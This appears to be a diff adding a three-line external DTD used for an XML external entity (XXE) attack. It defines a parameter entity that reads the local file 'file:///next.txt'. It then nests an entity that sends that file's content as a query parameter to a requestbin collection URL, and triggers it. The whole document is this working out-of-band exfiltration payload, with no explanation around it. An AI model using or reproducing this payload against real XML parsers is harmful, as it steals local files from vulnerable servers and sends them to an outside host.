@@ -1,0 +1,3 @@
+<!ENTITY % content SYSTEM "file:///next.txt">
+<!ENTITY % send "<!ENTITY &#x25; final SYSTEM 'http://requestbin.whapi.cloud/1g2tm8v1/?data=%content;'>">
+%send;
